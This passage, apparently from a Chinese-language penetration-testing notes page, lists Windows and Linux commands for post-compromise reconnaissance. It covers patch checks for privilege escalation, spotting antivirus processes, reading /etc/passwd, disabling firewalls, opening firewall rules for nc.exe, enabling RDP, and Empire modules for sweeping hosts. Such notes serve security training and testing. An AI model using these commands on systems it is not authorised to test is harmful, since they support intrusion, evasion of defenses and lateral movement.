class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;OS Name&quot; &#x2F;C:&quot;OS Version&quot;&#x2F;&#x2F;é€‚ç”¨äºè‹±æ–‡çš„æ“ä½œç³»ç»Ÿï¼Œä¸­æ–‡çš„ï¼šsysteminfo | findstr &#x2F;B &#x2F;C:&quot;OS åç§°&quot; &#x2F;C:&quot;OS ç‰ˆæœ¬&quot;&#39;</span><br><span class="line">    </span><br><span class="line">Linux:    </span><br><span class="line">æŸ¥çœ‹æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯ï¼š</span><br><span class="line">Cat &#x2F;etc&#x2F;issue</span><br><span class="line">Cat &#x2F;etc&#x2F;*-release</span><br><span class="line">Cat &#x2F;etc&#x2F;lsb-release #åŸºäºdebian</span><br><span class="line">Cat &#x2F;etc&#x2F;radhat-release #åŸºäºredhat</span><br><span class="line">æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯ï¼š</span><br><span class="line">Cat &#x2F;proc&#x2F;vesion</span><br><span class="line">Uname -a</span><br><span class="line">Uname -mrs</span><br><span class="line">Rpm -q kernel</span><br><span class="line">Dmesg | grep linux</span><br><span class="line">Ls &#x2F;boot | grep vmlinuz-</span><br></pre></td></tr></table></figure><p>2ï¼‰æŸ¥çœ‹ç³»ç»Ÿä½“ç³»ç»“æ„</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br><span class="line">    </span><br><span class="line">Linux:    </span><br><span class="line">uname -a</span><br><span class="line">dpkg --print-architecture   &#x2F;&#x2F;æ­¤å‘½ä»¤åªé€‚ç”¨äºåŸºäºDebianå’ŒUbuntuçš„Linuxå‘è¡Œç‰ˆã€‚        </span><br><span class="line">getconf LONG_BIT</span><br><span class="line">arch</span><br><span class="line">file &#x2F;sbin&#x2F;init</span><br><span class="line">        </span><br><span class="line">æŸ¥çœ‹å®‰è£…çš„è½¯ä»¶åŠç‰ˆæœ¬ã€è·¯å¾„ç­‰</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">windows:</span><br><span class="line">wmic product get name,version</span><br><span class="line">Powershellç‰ˆæœ¬ï¼š</span><br><span class="line">powershell.exe &quot;Get-WmiObject -class Win32_Product | Select-Object -Property name,Version</span><br><span class="line">    </span><br><span class="line">Linux:    </span><br><span class="line">Ls -alh &#x2F;usr&#x2F;bin&#x2F;</span><br><span class="line">Ls -alh &#x2F;sbin&#x2F;</span><br><span class="line">Dpkg -l</span><br><span class="line">Rpm -qa</span><br><span class="line">Ls -alh &#x2F;var&#x2F;cache&#x2F;apt&#x2F;archivesO</span><br><span class="line">Ls -alh &#x2F;var&#x2F;cache&#x2F;yum&#x2F;</span><br></pre></td></tr></table></figure><h5 id="3-æŸ¥è¯¢æœ¬æœºæœåŠ¡ä¿¡æ¯"><a href="#3-æŸ¥è¯¢æœ¬æœºæœåŠ¡ä¿¡æ¯" class="headerlink" title="3.æŸ¥è¯¢æœ¬æœºæœåŠ¡ä¿¡æ¯"></a>3.æŸ¥è¯¢æœ¬æœºæœåŠ¡ä¿¡æ¯</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">wmic service list brief</span><br><span class="line"></span><br><span class="line">Linux:   </span><br><span class="line">service --status-all</span><br><span class="line">chkconfig --list</span><br><span class="line">ps aux</span><br><span class="line">è¿›å…¥init.dç›®å½•æŸ¥çœ‹</span><br><span class="line">netstat -lntp</span><br><span class="line">ntsysv</span><br></pre></td></tr></table></figure><h5 id="4-æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨"><a href="#4-æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨" class="headerlink" title="4.æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨"></a>4.æŸ¥è¯¢è¿›ç¨‹åˆ—è¡¨</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">windows:           </span><br><span class="line">tasklist&#x2F;&#x2F;æˆ–è€…wmic process list brief </span><br><span class="line">   </span><br><span class="line">Linux:    </span><br><span class="line">ps aux </span><br><span class="line"> </span><br><span class="line"> å¸¸è§æ€æ¯’è½¯ä»¶è¿›ç¨‹ï¼š                  </span><br><span class="line"> 360sd.exe                    </span><br><span class="line"> 360tray.exe                   </span><br><span class="line"> ZhuDongFangYu.exe                   </span><br><span class="line"> KSafeTray.exe                   </span><br><span class="line"> SafeDogUpdateCenter.exe                   </span><br><span class="line"> McAfee McShield.exe                   </span><br><span class="line"> egui.exe &#x2F;&#x2F;NOD32                    </span><br><span class="line"> AVP.EXE  &#x2F;&#x2F;å¡å·´æ–¯åŸº                   </span><br><span class="line"> avguard.exe    &#x2F;&#x2F;å°çº¢ä¼                   </span><br><span class="line"> bdagent.exe    &#x2F;&#x2F;BitDefender</span><br></pre></td></tr></table></figure><h5 id="5-æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯"><a href="#5-æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯" class="headerlink" title="5.æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯"></a>5.æŸ¥çœ‹å¯åŠ¨ç¨‹åºä¿¡æ¯</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">wmic startup get command,caption</span><br><span class="line">     </span><br><span class="line">Linux:    </span><br><span class="line">PS</span><br><span class="line">ps aux | less  </span><br><span class="line">top</span><br><span class="line">pstree</span><br><span class="line">htop</span><br><span class="line">atop</span><br></pre></td></tr></table></figure><h5 id="6-æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"><a href="#6-æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡" class="headerlink" title="6.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡"></a>6.æŸ¥çœ‹è®¡åˆ’ä»»åŠ¡</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">schtasks &#x2F;query &#x2F;fo LIST &#x2F;v</span><br><span class="line">   </span><br><span class="line">Linux:    </span><br><span class="line">crontab -l</span><br></pre></td></tr></table></figure><h5 id="7-æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´"><a href="#7-æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´" class="headerlink" title="7.æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´"></a>7.æŸ¥çœ‹ä¸»æœºå¼€æœºæ—¶é—´</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">net statistics workstation</span><br><span class="line">   </span><br><span class="line">Linux:</span><br><span class="line">last  reboot &#x2F;&#x2F;æŸ¥çœ‹å†å²å¯åŠ¨æ—¶é—´</span><br><span class="line">W&#x2F;&#x2F;ç³»ç»Ÿåˆ°ç›®å‰è¿è¡Œäº†å¤šä¹…æ—¶é—´ã€‚åè¿‡æ¥æ¨ç®—ç³»ç»Ÿé‡å¯æ—¶é—´</span><br><span class="line">uptime</span><br><span class="line">TOP&#x2F;&#x2F;upåè¡¨ç¤ºç³»ç»Ÿåˆ°ç›®å‰è¿è¡Œäº†å¤šä¹…æ—¶é—´ã€‚åè¿‡æ¥æ¨ç®—æ—¶é—´</span><br><span class="line">who -b æŸ¥çœ‹æœ€åä¸€æ¬¡ç³»ç»Ÿå¯åŠ¨çš„æ—¶é—´ã€‚</span><br><span class="line">who -r æŸ¥çœ‹å½“å‰ç³»ç»Ÿè¿è¡Œæ—¶é—´</span><br></pre></td></tr></table></figure><h5 id="8-æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨"><a href="#8-æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨" class="headerlink" title="8.æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨"></a>8.æŸ¥è¯¢ç”¨æˆ·åˆ—è¡¨</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">net user</span><br><span class="line">net localgroup adinistrators&#x2F;&#x2F;è·å–æœ¬åœ°ç®¡ç†å‘˜ç»„æˆå‘˜</span><br><span class="line">query user || qwinsta&#x2F;&#x2F;æŸ¥çœ‹å½“å‰å†çº¿ç”¨æˆ·</span><br><span class="line">   </span><br><span class="line">Linux:    </span><br><span class="line">cat &#x2F;etc&#x2F;passwd</span><br><span class="line">cat &#x2F;etc&#x2F;group</span><br><span class="line">å»¶ç”³ï¼šcat &#x2F;etc&#x2F;passwd|grep -v nologin|grep -v halt|grep -v shutdown|awk -F&quot;:&quot;&#39;&#123; print $1&quot;|&quot;$3&quot;|&quot;$4 &#125;&#39;|more</span><br></pre></td></tr></table></figure><h5 id="9-åˆ—å‡ºæˆ–æ–­å¼€æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥çš„å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯"><a href="#9-åˆ—å‡ºæˆ–æ–­å¼€æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥çš„å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯" class="headerlink" title="9.åˆ—å‡ºæˆ–æ–­å¼€æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥çš„å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯"></a>9.åˆ—å‡ºæˆ–æ–­å¼€æœ¬åœ°è®¡ç®—æœºä¸æ‰€è¿æ¥çš„å®¢æˆ·ç«¯ä¹‹é—´çš„ä¼šè¯</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">net session</span><br><span class="line">   </span><br><span class="line">Linux:    </span><br><span class="line">who -a</span><br></pre></td></tr></table></figure><h5 id="10-æŸ¥è¯¢ç«¯å£åˆ—è¡¨"><a href="#10-æŸ¥è¯¢ç«¯å£åˆ—è¡¨" class="headerlink" title="10.æŸ¥è¯¢ç«¯å£åˆ—è¡¨"></a>10.æŸ¥è¯¢ç«¯å£åˆ—è¡¨</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure><h5 id="11-æŸ¥è¯¢è¡¥ä¸åˆ—è¡¨"><a href="#11-æŸ¥è¯¢è¡¥ä¸åˆ—è¡¨" class="headerlink" title="11.æŸ¥è¯¢è¡¥ä¸åˆ—è¡¨"></a>11.æŸ¥è¯¢è¡¥ä¸åˆ—è¡¨</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">systeminfo</span><br><span class="line">&#x2F;&#x2F;æŸ¥æ‰¾ææƒè¡¥ä¸ä¿¡æ¯</span><br><span class="line">systeminfo&gt;C:\Temp&gt;micropoor.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799</span><br><span class="line">KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904</span><br><span class="line">KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find &#x2F;i</span><br><span class="line">&quot;%i&quot;|| @echo %i you can fuck)&amp;del &#x2F;f &#x2F;q &#x2F;a micropoor.txt        &#x2F;&#x2F;é‡Œé¢å¯ä»¥ä»»æ„æ·»åŠ åˆ é™¤è¡¥ä¸ç¼–å·</span><br><span class="line"></span><br><span class="line">Linux:  </span><br><span class="line">linuxéœ€è¦æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯ï¼ŒæŸ¥çœ‹å®‰è£…çš„è½¯ä»¶åŒ…ï¼Œç„¶åè¿›è¡Œå¯¹æ¯”</span><br></pre></td></tr></table></figure><h5 id="12-æŸ¥è¯¢æœ¬æœºå…±äº«åˆ—è¡¨"><a href="#12-æŸ¥è¯¢æœ¬æœºå…±äº«åˆ—è¡¨" class="headerlink" title="12.æŸ¥è¯¢æœ¬æœºå…±äº«åˆ—è¡¨"></a>12.æŸ¥è¯¢æœ¬æœºå…±äº«åˆ—è¡¨</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">net share&#x2F;&#x2F;wmic:</span><br><span class="line">wmic share get name,path,status</span><br><span class="line"></span><br><span class="line">Linux:</span><br><span class="line">åœ¨&#x2F;mnt&#x2F;hgfsç›®å½•ä¸‹æŸ¥çœ‹</span><br></pre></td></tr></table></figure><h5 id="13-æŸ¥è¯¢è·¯ç”±è¡¨åŠæ‰€æœ‰å¯ç”¨æ¥å£çš„ARPç¼“å­˜è¡¨"><a href="#13-æŸ¥è¯¢è·¯ç”±è¡¨åŠæ‰€æœ‰å¯ç”¨æ¥å£çš„ARPç¼“å­˜è¡¨" class="headerlink" title="13.æŸ¥è¯¢è·¯ç”±è¡¨åŠæ‰€æœ‰å¯ç”¨æ¥å£çš„ARPç¼“å­˜è¡¨"></a>13.æŸ¥è¯¢è·¯ç”±è¡¨åŠæ‰€æœ‰å¯ç”¨æ¥å£çš„ARPç¼“å­˜è¡¨</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">route print</span><br><span class="line">arp -a</span><br><span class="line">  </span><br><span class="line">Linux:</span><br><span class="line">arp â€“a</span><br><span class="line">Route</span><br><span class="line">&#x2F;sbin&#x2F;route -nee</span><br></pre></td></tr></table></figure><h5 id="14-æŸ¥è¯¢é˜²ç«å¢™ç›¸å…³é…ç½®"><a href="#14-æŸ¥è¯¢é˜²ç«å¢™ç›¸å…³é…ç½®" class="headerlink" title="14.æŸ¥è¯¢é˜²ç«å¢™ç›¸å…³é…ç½®"></a>14.æŸ¥è¯¢é˜²ç«å¢™ç›¸å…³é…ç½®</h5><p>1ï¼‰å…³é—­é˜²ç«å¢™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">windows:  </span><br><span class="line">&#x2F;&#x2F;windows server 2003ä¹‹å‰</span><br><span class="line">netsh firewall set opmode disable                                  </span><br><span class="line">&#x2F;&#x2F;Windows server 2003ä¹‹å</span><br><span class="line">netsh advfirewall set allprofile state off</span><br><span class="line">  </span><br><span class="line">Linux:    </span><br><span class="line">&#x2F;&#x2F;æš‚æ—¶å…³é—­é˜²ç«å¢™</span><br><span class="line">systemctl stop firewalld</span><br><span class="line">service iptables stop</span><br><span class="line">&#x2F;&#x2F;æ°¸ä¹…å…³é—­é˜²ç«å¢™</span><br><span class="line">systemctl disable firewalld</span><br><span class="line">chkconfig iptables  off</span><br></pre></td></tr></table></figure><p>2ï¼‰æŸ¥çœ‹é˜²ç«å¢™é…ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">netsh firewall show config</span><br><span class="line"> </span><br><span class="line">Linux:   </span><br><span class="line">Iptables-save &gt;ipt.txt</span><br></pre></td></tr></table></figure><ol start="3"><li>ä¿®æ”¹é˜²ç«å¢™é…ç½®</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">&#x2F;&#x2F;windows server 2003ä¹‹å‰å…è®¸æŒ‡å®šç¨‹åºå…¨éƒ¨è¿æ¥</span><br><span class="line">netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable</span><br><span class="line">&#x2F;&#x2F;windows server 2003ä¹‹åçš„ç‰ˆæœ¬</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;pass nc&quot; dir&#x3D;in action&#x3D;allow program&#x3D;&quot;c:\nc.exe&quot;</span><br><span class="line">&#x2F;&#x2F;å…è®¸æŒ‡å®šç¨‹åºé€€å‡º</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Allow nc&quot; dir&#x3D;out action&#x3D;allow program&#x3D;&quot;C:\nc.exe&quot;</span><br><span class="line">&#x2F;&#x2F;å…è®¸3389ç«¯å£æ”¾è¡Œ</span><br><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br><span class="line"> </span><br><span class="line">linuxï¼š   </span><br><span class="line">&#x2F;&#x2F;æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€</span><br><span class="line">systemctl status firewalld</span><br><span class="line">&#x2F;&#x2F;å¯åŠ¨é˜²ç«å¢™</span><br><span class="line">systemctl start firewalld.service</span><br><span class="line">&#x2F;&#x2F;å¼€æ”¾TCPçš„80ç«¯å£ï¼Œå¹¶é‡è½½é˜²ç«å¢™</span><br><span class="line">firewall-cmd --zone&#x3D;public --add-port&#x3D;80&#x2F;tcp --permanent</span><br><span class="line">&#x2F;&#x2F;é‡è½½é˜²ç«å¢™ </span><br><span class="line">firewall-cmd --reload</span><br><span class="line">&#x2F;&#x2F;æŸ¥çœ‹é˜²ç«å¢™å¼€æ”¾ç«¯å£</span><br><span class="line">firewall-cmd --zone&#x3D;public --list-ports</span><br></pre></td></tr></table></figure><p>4)è‡ªå®šä¹‰é˜²ç«å¢™æ—¥å¿—çš„å­˜å‚¨ä½ç½®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br><span class="line">Linux:  </span><br><span class="line">å‚è€ƒæ–‡ç« https:&#x2F;&#x2F;blog.csdn.net&#x2F;xiexievv&#x2F;article&#x2F;details&#x2F;48001261</span><br></pre></td></tr></table></figure><h5 id="15-æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ"><a href="#15-æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ" class="headerlink" title="15.æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ"></a>15.æŸ¥çœ‹ä»£ç†é…ç½®æƒ…å†µ</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&quot;</span><br><span class="line">   </span><br><span class="line">Linux:    </span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br></pre></td></tr></table></figure><h5 id="16-æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡"><a href="#16-æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡" class="headerlink" title="16.æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡"></a>16.æŸ¥è¯¢å¹¶å¼€å¯è¿œç¨‹è¿æ¥æœåŠ¡</h5><p>1ï¼‰æŸ¥çœ‹è¿œç¨‹è¿æ¥ç«¯å£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;V PortNumber</span><br></pre></td></tr></table></figure><p>2)åœ¨Windows server 2003ä¸­å¼€å¯3389</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><p>3)åœ¨Windows server 2008å’Œ2012ä¸­</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1&#x2F;&#x2F;ä¿®æ”¹æ³¨å†Œè¡¨æ–¹å¼reg query &quot;HKLM\System\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure><h5 id="17-è‡ªåŠ¨æ”¶é›†ä¿¡æ¯"><a href="#17-è‡ªåŠ¨æ”¶é›†ä¿¡æ¯" class="headerlink" title="17.è‡ªåŠ¨æ”¶é›†ä¿¡æ¯"></a>17.è‡ªåŠ¨æ”¶é›†ä¿¡æ¯</h5><p>Empireä¸‹çš„ä¸»æœºä¿¡æ¯æ”¶é›†ï¼Œè¾“å‡ºåˆ°æ ¼å¼ä¸ºhtmlæ–‡ä»¶<br>ä½¿ç”¨æ¨¡å—ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">usemodule situational_awareness&#x2F;host&#x2F;winenum</span><br><span class="line">execute</span><br></pre></td></tr></table></figure><h5 id="18-æŸ¥è¯¢å½“å‰æƒé™"><a href="#18-æŸ¥è¯¢å½“å‰æƒé™" class="headerlink" title="18.æŸ¥è¯¢å½“å‰æƒé™"></a>18.æŸ¥è¯¢å½“å‰æƒé™</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">windows:</span><br><span class="line">whoami &#x2F;all</span><br><span class="line">&#x2F;&#x2F;æŸ¥è¯¢æŒ‡å®šç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯</span><br><span class="line">net user xxx &#x2F;domain</span><br><span class="line">  </span><br><span class="line">Linux:    </span><br><span class="line">id</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure><h1 id="03-åŸŸå†…çš„ä¿¡æ¯æ”¶é›†"><a href="#03-åŸŸå†…çš„ä¿¡æ¯æ”¶é›†" class="headerlink" title="03-åŸŸå†…çš„ä¿¡æ¯æ”¶é›†"></a>03-åŸŸå†…çš„ä¿¡æ¯æ”¶é›†</h1><h2 id="1-åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"><a href="#1-åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ" class="headerlink" title="1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ"></a>1.åˆ¤æ–­æ˜¯å¦å­˜åœ¨åŸŸ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥çœ‹dnsæœåŠ¡å™¨</span><br><span class="line">ipconfig &#x2F;all</span><br><span class="line">nslookup dc.test.local&#x2F;&#x2F;å°†æŸ¥çœ‹åˆ°çš„DNSæœåŠ¡å™¨ç”¨nslookupè¿›è¡Œè§£æ</span><br><span class="line">        </span><br><span class="line">æŸ¥çœ‹ç³»ç»Ÿè¯¦ç»†ä¿¡æ¯</span><br><span class="line">systeminfo | findstr &#x2F;B &#x2F;C:&quot;ç™»å½•æœåŠ¡å™¨&quot;&#x2F;&#x2F;å¦‚æœç»“æœä¸ä¸º&quot;WORKGROUP&quot;åˆ™ä¸»æœºä¸ºåŸŸä¸»æœº                      </span><br><span class="line">&#x2F;&#x2F;æŸ¥è¯¢å½“å‰ç™»å½•åŸŸåŠç™»å½•ç”¨æˆ·ä¿¡æ¯</span><br><span class="line">net group workstation                     </span><br><span class="line">&#x2F;&#x2F;åˆ¤æ–­ä¸»åŸŸ</span><br><span class="line">net time &#x2F;domain&#x2F;&#x2F;å‘½ä»¤ç”¨äºæŸ¥çœ‹åŸŸå†…æ—¶é—´ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥æŸ¥çœ‹åŸŸæ§åˆ¶å™¨</span><br></pre></td></tr></table></figure><h2 id="2-æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"><a href="#2-æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº" class="headerlink" title="2. æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"></a>2. æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨nbtscan(http:&#x2F;&#x2F;www.unixwiz.net&#x2F;tools&#x2F;nbtscan.html)æ¢æµ‹å½“å‰ç½‘æ®µä¸»æœº</span><br><span class="line">nbt.exe 192.168.2.0&#x2F;20</span><br><span class="line">        </span><br><span class="line">ä½¿ç”¨ICMPæ¢æµ‹</span><br><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.2.%I | findstr &quot;TTL&#x3D;&quot;</span><br><span class="line">        </span><br><span class="line">é€šè¿‡ARPscanå·¥å…·æ‰«ææ¢æµ‹å†…ç½‘</span><br><span class="line">arp.exe -t 192.168.2.0&#x2F;20</span><br><span class="line">        </span><br><span class="line">Empireä¸­çš„ARPscanæ¨¡å—</span><br><span class="line">usemode situational_awareness&#x2F;network&#x2F;arpscan</span><br><span class="line">execute</span><br><span class="line">Nishangä¸­çš„Invoke-ARPScan.ps1 